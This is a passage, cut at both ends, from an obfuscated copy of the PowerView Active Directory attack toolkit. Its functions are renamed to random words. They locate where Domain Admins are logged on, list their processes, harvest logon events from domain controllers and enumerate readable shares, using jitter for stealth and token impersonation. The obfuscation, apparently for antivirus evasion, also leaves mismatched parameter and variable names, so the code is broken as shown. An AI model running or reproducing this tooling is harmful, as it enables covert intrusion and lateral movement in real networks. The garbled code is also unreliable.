                                    $QjuQctNC99 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                }
                                else {
                                    $QjuQctNC99 | Add-Member Noteproperty 'LocalAdmin' $Null
                                }
                                $QjuQctNC99.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                $QjuQctNC99
                            }
                        }
                    }
                    if (-not $HmpPrHTL99) {
                        $MWzbSgCr99 = carcinogens -wkNUqpQt99 $baXLhAGw99
                        ForEach ($User in $MWzbSgCr99) {
                            $OpgheHcJ99 = $User.UserName
                            $tpoFORKS99 = $User.LogonDomain

                            if (($OpgheHcJ99) -and ($OpgheHcJ99.trim() -ne '')) {
                                if ( (-not $xHNtbWdb99) -or ($xHNtbWdb99 -contains $OpgheHcJ99) -and ($OpgheHcJ99 -notmatch '\$$')) {
                                    $TCQcnJtN99 = @(jocular -wkNUqpQt99 $baXLhAGw99)[0].IPAddress
                                    $QjuQctNC99 = New-Object PSObject
                                    $QjuQctNC99 | Add-Member Noteproperty 'UserDomain' $tpoFORKS99
                                    $QjuQctNC99 | Add-Member Noteproperty 'UserName' $OpgheHcJ99
                                    $QjuQctNC99 | Add-Member Noteproperty 'ComputerName' $baXLhAGw99
                                    $QjuQctNC99 | Add-Member Noteproperty 'IPAddress' $TCQcnJtN99
                                    $QjuQctNC99 | Add-Member Noteproperty 'SessionFrom' $Null
                                    $QjuQctNC99 | Add-Member Noteproperty 'SessionFromName' $Null

                                    if ($YMUmbxod99) {
                                        $Admin = maimed -wkNUqpQt99 $baXLhAGw99
                                        $QjuQctNC99 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                    }
                                    else {
                                        $QjuQctNC99 | Add-Member Noteproperty 'LocalAdmin' $Null
                                    }
                                    $QjuQctNC99.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                    $QjuQctNC99
                                }
                            }
                        }
                    }
                }
            }

            if ($LHlspMYk99) {
                impregnates
            }
        }

        $glRtrabU99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $glRtrabU99 = sinfulness -ZiReXCQu99 $ZiReXCQu99
            }
            else {
                $glRtrabU99 = sinfulness -ZiReXCQu99 $ZiReXCQu99 -Quiet
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[eyeball] Total number of hosts: $($OMilugXw99.count)"
            Write-Verbose "[eyeball] Delay: $Delay, Jitter: $uPQrThoX99"
            $ADMsIjFY99 = 0
            $oGsSshCv99 = New-Object System.Random

            ForEach ($baXLhAGw99 in $OMilugXw99) {
                $ADMsIjFY99 = $ADMsIjFY99 + 1

                Start-Sleep -Seconds $oGsSshCv99.Next((1-$uPQrThoX99)*$Delay, (1+$uPQrThoX99)*$Delay)

                Write-Verbose "[eyeball] Enumerating server $LqojfQUN99 ($ADMsIjFY99 of $($OMilugXw99.Count))"
                Invoke-Command -atfuqJht99 $ESVuaknJ99 -ArgumentList $baXLhAGw99, $xHNtbWdb99, $ynTRKzgD99, $HmpPrHTL99, $glRtrabU99

                if ($BSvRtRei99 -and $XQLnuWbD99) {
                    Write-Verbose "[eyeball] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[eyeball] Using threading with threads: $egZrjTFJ99"
            Write-Verbose "[eyeball] TargetComputers length: $($OMilugXw99.Length)"

            $FjHZlPac99 = @{
                'TargetUsers' = $xHNtbWdb99
                'CurrentUser' = $ynTRKzgD99
                'Stealth' = $HmpPrHTL99
                'TokenHandle' = $glRtrabU99
            }

            uterus -wkNUqpQt99 $OMilugXw99 -atfuqJht99 $ESVuaknJ99 -tUtdHhZX99 $FjHZlPac99 -egZrjTFJ99 $egZrjTFJ99
        }
    }

    END {
        if ($glRtrabU99) {
            impregnates -LHlspMYk99 $glRtrabU99
        }
    }
}


function casseroles {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $wkNUqpQt99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [String]
        $eYhHHjYI99,

        [ValidateNotNullOrEmpty()]
        [String]
        $aLBeTPoV99,

        [ValidateNotNullOrEmpty()]
        [String]
        $fTvmLSVQ99,

        [Alias('Unconstrained')]
        [Switch]
        $zRqPGeGF99,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $hhyeAfOa99,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $MFXSjlPv99,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $qEkuFkiO99,

        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PKtJrukQ99,

        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tcefOwYo99,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $tpoFORKS99,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $vDIOaaYt99,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $aDAKSwxN99,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $OMxvPLlz99 = 'Domain Admins',

        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $BQpkcsAN99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $XQLnuWbD99,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $uPQrThoX99 = .3,

        [Int]
        [ValidateRange(1, 100)]
        $egZrjTFJ99 = 20
    )

    BEGIN {
        $ZotlnKrB99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $ZotlnKrB99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['ComputerDomain']) { $ZotlnKrB99['Domain'] = $eYhHHjYI99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ZotlnKrB99['LDAPFilter'] = $aLBeTPoV99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $ZotlnKrB99['SearchBase'] = $fTvmLSVQ99 }
        if ($PSBoundParameters['Unconstrained']) { $ZotlnKrB99['Unconstrained'] = $gxCjQSqn99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ZotlnKrB99['OperatingSystem'] = $DfPrQYoc99 }
        if ($PSBoundParameters['ComputerServicePack']) { $ZotlnKrB99['ServicePack'] = $kKsiFEfu99 }
        if ($PSBoundParameters['ComputerSiteName']) { $ZotlnKrB99['SiteName'] = $ZBmuuCEe99 }
        if ($PSBoundParameters['Server']) { $ZotlnKrB99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $ZotlnKrB99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $ZotlnKrB99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $ZotlnKrB99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $ZotlnKrB99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $ZotlnKrB99['Credential'] = $ZiReXCQu99 }

        $nJXaFCNO99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $nJXaFCNO99['Identity'] = $tcefOwYo99 }
        if ($PSBoundParameters['Domain']) { $nJXaFCNO99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['UserDomain']) { $nJXaFCNO99['Domain'] = $tpoFORKS99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $nJXaFCNO99['LDAPFilter'] = $vDIOaaYt99 }
        if ($PSBoundParameters['UserSearchBase']) { $nJXaFCNO99['SearchBase'] = $aDAKSwxN99 }
        if ($PSBoundParameters['UserAdminCount']) { $nJXaFCNO99['AdminCount'] = $BQpkcsAN99 }
        if ($PSBoundParameters['Server']) { $nJXaFCNO99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $nJXaFCNO99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $nJXaFCNO99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nJXaFCNO99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $nJXaFCNO99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $nJXaFCNO99['Credential'] = $ZiReXCQu99 }


        if ($PSBoundParameters['ComputerName']) {
            $OMilugXw99 = $wkNUqpQt99
        }
        else {
            Write-Verbose '[casseroles] Querying computers in the domain'
            $OMilugXw99 = Rankine @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[casseroles] TargetComputers length: $($OMilugXw99.Length)"
        if ($OMilugXw99.Length -eq 0) {
            throw '[casseroles] No hosts found to enumerate'
        }

        if ($PSBoundParameters['ProcessName']) {
            $viQIRbrL99 = @()
            ForEach ($T in $PKtJrukQ99) {
                $viQIRbrL99 += $T.Split(',')
            }
            if ($viQIRbrL99 -isnot [System.Array]) {
                $viQIRbrL99 = [String[]] @($viQIRbrL99)
            }
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $xHNtbWdb99 = bobcats @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $khbopPBb99 = @{
                'Identity' = $OMxvPLlz99
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $khbopPBb99['Domain'] = $tpoFORKS99 }
            if ($PSBoundParameters['UserSearchBase']) { $khbopPBb99['SearchBase'] = $aDAKSwxN99 }
            if ($PSBoundParameters['Server']) { $khbopPBb99['Server'] = $VmSwBdTN99 }
            if ($PSBoundParameters['SearchScope']) { $khbopPBb99['SearchScope'] = $YtWADKZe99 }
            if ($PSBoundParameters['ResultPageSize']) { $khbopPBb99['ResultPageSize'] = $JYnIcwBJ99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $khbopPBb99['ServerTimeLimit'] = $fEdVcXRd99 }
            if ($PSBoundParameters['Tombstone']) { $khbopPBb99['Tombstone'] = $uomKXjrL99 }
            if ($PSBoundParameters['Credential']) { $khbopPBb99['Credential'] = $ZiReXCQu99 }
            $khbopPBb99
            $xHNtbWdb99 = pinup @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        $ESVuaknJ99 = {
            Param($wkNUqpQt99, $PKtJrukQ99, $xHNtbWdb99, $ZiReXCQu99)

            ForEach ($baXLhAGw99 in $wkNUqpQt99) {
                $Up = Test-Connection -Count 1 -Quiet -wkNUqpQt99 $baXLhAGw99
                if ($Up) {
                    if ($ZiReXCQu99) {
                        $eAvesssM99 = anthropomorphism -ZiReXCQu99 $ZiReXCQu99 -wkNUqpQt99 $baXLhAGw99 -ErrorAction SilentlyContinue
                    }
                    else {
                        $eAvesssM99 = anthropomorphism -wkNUqpQt99 $baXLhAGw99 -ErrorAction SilentlyContinue
                    }
                    ForEach ($MYoEJgiY99 in $eAvesssM99) {
                        if ($PKtJrukQ99) {
                            if ($PKtJrukQ99 -Contains $MYoEJgiY99.ProcessName) {
                                $MYoEJgiY99
                            }
                        }
                        elseif ($xHNtbWdb99 -Contains $MYoEJgiY99.User) {
                            $MYoEJgiY99
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[casseroles] Total number of hosts: $($OMilugXw99.count)"
            Write-Verbose "[casseroles] Delay: $Delay, Jitter: $uPQrThoX99"
            $ADMsIjFY99 = 0
            $oGsSshCv99 = New-Object System.Random

            ForEach ($baXLhAGw99 in $OMilugXw99) {
                $ADMsIjFY99 = $ADMsIjFY99 + 1

                Start-Sleep -Seconds $oGsSshCv99.Next((1-$uPQrThoX99)*$Delay, (1+$uPQrThoX99)*$Delay)

                Write-Verbose "[casseroles] Enumerating server $baXLhAGw99 ($ADMsIjFY99 of $($OMilugXw99.count))"
                $BSvRtRei99 = Invoke-Command -atfuqJht99 $ESVuaknJ99 -ArgumentList $baXLhAGw99, $viQIRbrL99, $xHNtbWdb99, $ZiReXCQu99
                $BSvRtRei99

                if ($BSvRtRei99 -and $XQLnuWbD99) {
                    Write-Verbose "[casseroles] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[casseroles] Using threading with threads: $egZrjTFJ99"

            $FjHZlPac99 = @{
                'ProcessName' = $viQIRbrL99
                'TargetUsers' = $xHNtbWdb99
                'Credential' = $ZiReXCQu99
            }

            uterus -wkNUqpQt99 $OMilugXw99 -atfuqJht99 $ESVuaknJ99 -tUtdHhZX99 $FjHZlPac99 -egZrjTFJ99 $egZrjTFJ99
        }
    }
}


function Dorian {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $wkNUqpQt99,

        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $cqPynTGG99,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $dOSflyxA99 = [DateTime]::Now.AddDays(-1),

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LSmUhHgs99 = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $ncTXkyQU99 = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $tcefOwYo99,

        [ValidateNotNullOrEmpty()]
        [String]
        $tpoFORKS99,

        [ValidateNotNullOrEmpty()]
        [String]
        $vDIOaaYt99,

        [ValidateNotNullOrEmpty()]
        [String]
        $aDAKSwxN99,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $OMxvPLlz99 = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        $BQpkcsAN99,

        [Switch]
        $YMUmbxod99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $XQLnuWbD99,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $uPQrThoX99 = .3,

        [Int]
        [ValidateRange(1, 100)]
        $egZrjTFJ99 = 20
    )

    BEGIN {
        $nJXaFCNO99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $nJXaFCNO99['Identity'] = $tcefOwYo99 }
        if ($PSBoundParameters['UserDomain']) { $nJXaFCNO99['Domain'] = $tpoFORKS99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $nJXaFCNO99['LDAPFilter'] = $vDIOaaYt99 }
        if ($PSBoundParameters['UserSearchBase']) { $nJXaFCNO99['SearchBase'] = $aDAKSwxN99 }
        if ($PSBoundParameters['UserAdminCount']) { $nJXaFCNO99['AdminCount'] = $BQpkcsAN99 }
        if ($PSBoundParameters['Server']) { $nJXaFCNO99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $nJXaFCNO99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $nJXaFCNO99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nJXaFCNO99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $nJXaFCNO99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $nJXaFCNO99['Credential'] = $ZiReXCQu99 }

        if ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount']) {
            $xHNtbWdb99 = bobcats @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters['UserGroupIdentity'] -or (-not $PSBoundParameters['Filter'])) {
            $khbopPBb99 = @{
                'Identity' = $OMxvPLlz99
                'Recurse' = $True
            }
            Write-Verbose "UserGroupIdentity: $OMxvPLlz99"
            if ($PSBoundParameters['UserDomain']) { $khbopPBb99['Domain'] = $tpoFORKS99 }
            if ($PSBoundParameters['UserSearchBase']) { $khbopPBb99['SearchBase'] = $aDAKSwxN99 }
            if ($PSBoundParameters['Server']) { $khbopPBb99['Server'] = $VmSwBdTN99 }
            if ($PSBoundParameters['SearchScope']) { $khbopPBb99['SearchScope'] = $YtWADKZe99 }
            if ($PSBoundParameters['ResultPageSize']) { $khbopPBb99['ResultPageSize'] = $JYnIcwBJ99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $khbopPBb99['ServerTimeLimit'] = $fEdVcXRd99 }
            if ($PSBoundParameters['Tombstone']) { $khbopPBb99['Tombstone'] = $uomKXjrL99 }
            if ($PSBoundParameters['Credential']) { $khbopPBb99['Credential'] = $ZiReXCQu99 }
            $xHNtbWdb99 = pinup @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        if ($PSBoundParameters['ComputerName']) {
            $OMilugXw99 = $wkNUqpQt99
        }
        else {
            $wSGpRmul99 = @{
                'LDAP' = $True
            }
            if ($PSBoundParameters['Domain']) { $wSGpRmul99['Domain'] = $XQOKQXGr99 }
            if ($PSBoundParameters['Server']) { $wSGpRmul99['Server'] = $VmSwBdTN99 }
            if ($PSBoundParameters['Credential']) { $wSGpRmul99['Credential'] = $ZiReXCQu99 }
            Write-Verbose "[Dorian] Querying for domain controllers in domain: $XQOKQXGr99"
            $OMilugXw99 = Elysium @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        if ($OMilugXw99 -and ($OMilugXw99 -isnot [System.Array])) {
            $OMilugXw99 = @(,$OMilugXw99)
        }
        Write-Verbose "[Dorian] TargetComputers length: $($OMilugXw99.Length)"
        Write-Verbose "[Dorian] TargetComputers $OMilugXw99"
        if ($OMilugXw99.Length -eq 0) {
            throw '[Dorian] No hosts found to enumerate'
        }

        $ESVuaknJ99 = {
            Param($wkNUqpQt99, $dOSflyxA99, $LSmUhHgs99, $ncTXkyQU99, $xHNtbWdb99, $cqPynTGG99, $ZiReXCQu99)

            ForEach ($baXLhAGw99 in $wkNUqpQt99) {
                $Up = Test-Connection -Count 1 -Quiet -wkNUqpQt99 $baXLhAGw99
                if ($Up) {
                    $EYYEWNcH99 = @{
                        'ComputerName' = $baXLhAGw99
                    }
                    if ($dOSflyxA99) { $EYYEWNcH99['StartTime'] = $dOSflyxA99 }
                    if ($LSmUhHgs99) { $EYYEWNcH99['EndTime'] = $LSmUhHgs99 }
                    if ($ncTXkyQU99) { $EYYEWNcH99['MaxEvents'] = $ncTXkyQU99 }
                    if ($ZiReXCQu99) { $EYYEWNcH99['Credential'] = $ZiReXCQu99 }
                    if ($cqPynTGG99 -or $xHNtbWdb99) {
                        if ($xHNtbWdb99) {
                            homburg @DomainUserEventArgs | Where-Object {$xHNtbWdb99 -contains $_.TargetUserName}
                        }
                        else {
                            $CzBtbHzs99 = 'or'
                            $cqPynTGG99.Keys | ForEach-Object {
                                if (($_ -eq 'Op') -or ($_ -eq 'Operator') -or ($_ -eq 'Operation')) {
                                    if (($cqPynTGG99[$_] -match '&') -or ($cqPynTGG99[$_] -eq 'and')) {
                                        $CzBtbHzs99 = 'and'
                                    }
                                }
                            }
                            $Keys = $cqPynTGG99.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne 'Operator') -and ($_ -ne 'Operation')}
                            homburg @DomainUserEventArgs | ForEach-Object {
                                if ($CzBtbHzs99 -eq 'or') {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -match $cqPynTGG99[$Key]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -notmatch $cqPynTGG99[$Key]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        homburg @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Dorian] Total number of hosts: $($OMilugXw99.count)"
            Write-Verbose "[Dorian] Delay: $Delay, Jitter: $uPQrThoX99"
            $ADMsIjFY99 = 0
            $oGsSshCv99 = New-Object System.Random

            ForEach ($baXLhAGw99 in $OMilugXw99) {
                $ADMsIjFY99 = $ADMsIjFY99 + 1

                Start-Sleep -Seconds $oGsSshCv99.Next((1-$uPQrThoX99)*$Delay, (1+$uPQrThoX99)*$Delay)

                Write-Verbose "[Dorian] Enumerating server $baXLhAGw99 ($ADMsIjFY99 of $($OMilugXw99.count))"
                $BSvRtRei99 = Invoke-Command -atfuqJht99 $ESVuaknJ99 -ArgumentList $baXLhAGw99, $dOSflyxA99, $LSmUhHgs99, $ncTXkyQU99, $xHNtbWdb99, $cqPynTGG99, $ZiReXCQu99
                $BSvRtRei99

                if ($BSvRtRei99 -and $XQLnuWbD99) {
                    Write-Verbose "[Dorian] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Dorian] Using threading with threads: $egZrjTFJ99"

            $FjHZlPac99 = @{
                'StartTime' = $dOSflyxA99
                'EndTime' = $LSmUhHgs99
                'MaxEvents' = $ncTXkyQU99
                'TargetUsers' = $xHNtbWdb99
                'Filter' = $cqPynTGG99
                'Credential' = $ZiReXCQu99
            }

            uterus -wkNUqpQt99 $OMilugXw99 -atfuqJht99 $ESVuaknJ99 -tUtdHhZX99 $FjHZlPac99 -egZrjTFJ99 $egZrjTFJ99
        }
    }
}


function Josef {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $wkNUqpQt99,

        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $eYhHHjYI99,

        [ValidateNotNullOrEmpty()]
        [String]
        $aLBeTPoV99,

        [ValidateNotNullOrEmpty()]
        [String]
        $fTvmLSVQ99,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $hhyeAfOa99,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $MFXSjlPv99,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $qEkuFkiO99,

        [Alias('CheckAccess')]
        [Switch]
        $PCGKuwQz99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $uPQrThoX99 = .3,

        [Int]
        [ValidateRange(1, 100)]
        $egZrjTFJ99 = 20
    )

    BEGIN {

        $ZotlnKrB99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ZotlnKrB99['Domain'] = $eYhHHjYI99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ZotlnKrB99['LDAPFilter'] = $aLBeTPoV99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $ZotlnKrB99['SearchBase'] = $fTvmLSVQ99 }
        if ($PSBoundParameters['Unconstrained']) { $ZotlnKrB99['Unconstrained'] = $gxCjQSqn99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ZotlnKrB99['OperatingSystem'] = $DfPrQYoc99 }
        if ($PSBoundParameters['ComputerServicePack']) { $ZotlnKrB99['ServicePack'] = $kKsiFEfu99 }
        if ($PSBoundParameters['ComputerSiteName']) { $ZotlnKrB99['SiteName'] = $ZBmuuCEe99 }
        if ($PSBoundParameters['Server']) { $ZotlnKrB99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $ZotlnKrB99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $ZotlnKrB99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $ZotlnKrB99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $ZotlnKrB99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $ZotlnKrB99['Credential'] = $ZiReXCQu99 }

        if ($PSBoundParameters['ComputerName']) {
            $OMilugXw99 = $wkNUqpQt99
        }
        else {
            Write-Verbose '[Josef] Querying computers in the domain'
            $OMilugXw99 = Rankine @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Josef] TargetComputers length: $($OMilugXw99.Length)"
        if ($OMilugXw99.Length -eq 0) {
            throw '[Josef] No hosts found to enumerate'
        }

        $ESVuaknJ99 = {
            Param($wkNUqpQt99, $PCGKuwQz99, $LHlspMYk99)

            if ($LHlspMYk99) {
                $Null = sinfulness -LHlspMYk99 $LHlspMYk99 -Quiet
            }

            ForEach ($baXLhAGw99 in $wkNUqpQt99) {
                $Up = Test-Connection -Count 1 -Quiet -wkNUqpQt99 $baXLhAGw99
                if ($Up) {
                    $aaSlEMZv99 = deferment -wkNUqpQt99 $baXLhAGw99
                    ForEach ($Share in $aaSlEMZv99) {
                        $sRfeUCXV99 = $Share.Name
                        $Path = '\\'+$baXLhAGw99+'\'+$sRfeUCXV99

                        if (($sRfeUCXV99) -and ($sRfeUCXV99.trim() -ne '')) {
                            if ($PCGKuwQz99) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $Share
                                }
                                catch {
                                    Write-Verbose "Error accessing share path $Path : $_"
                                }
                            }
                            else {
                                $Share
                            }
                        }
                    }
                }
            }

            if ($LHlspMYk99) {
                impregnates
            }
        }

        $glRtrabU99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $glRtrabU99 = sinfulness -ZiReXCQu99 $ZiReXCQu99
            }
            else {
                $glRtrabU99 = sinfulness -ZiReXCQu99 $ZiReXCQu99 -Quiet
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Josef] Total number of hosts: $($OMilugXw99.count)"
            Write-Verbose "[Josef] Delay: $Delay, Jitter: $uPQrThoX99"
            $ADMsIjFY99 = 0
            $oGsSshCv99 = New-Object System.Random

            ForEach ($baXLhAGw99 in $OMilugXw99) {
                $ADMsIjFY99 = $ADMsIjFY99 + 1

